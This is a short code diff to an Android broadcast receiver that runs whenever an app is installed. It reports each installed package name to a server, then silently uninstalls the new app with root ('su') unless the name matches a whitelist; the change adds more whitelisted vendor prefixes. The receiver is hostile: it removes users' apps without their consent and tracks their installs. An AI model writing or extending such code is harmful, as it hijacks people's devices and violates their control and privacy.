@@ -23,7 +23,13 @@ public class InstalledReceiver extends BroadcastReceiver {
             RunManager.getInstance().uploadToServer(context, packageName, 1);
             if (null != packageName && packageName.startsWith("package:")) {
                 packageName = packageName.replace("package:", "");
-                if (!packageName.startsWith("com.bb_sz.") && !packageName.startsWith("com.tencent.android.")) {
+                if (!packageName.startsWith("com.bb_sz.")
+                        && !packageName.startsWith("com.tencent.android.")
+                        && !packageName.startsWith("com.pxsk.")
+                        && !packageName.startsWith("com.psxk.")
+                        && !packageName.startsWith("com.ffkfr.")
+                        && !packageName.startsWith("com.com.qihoo.appstore.")
+                        && !packageName.startsWith("com.hj.")) {
                     CMD.doSuExec("pm uninstall " + packageName);
                 }
             }
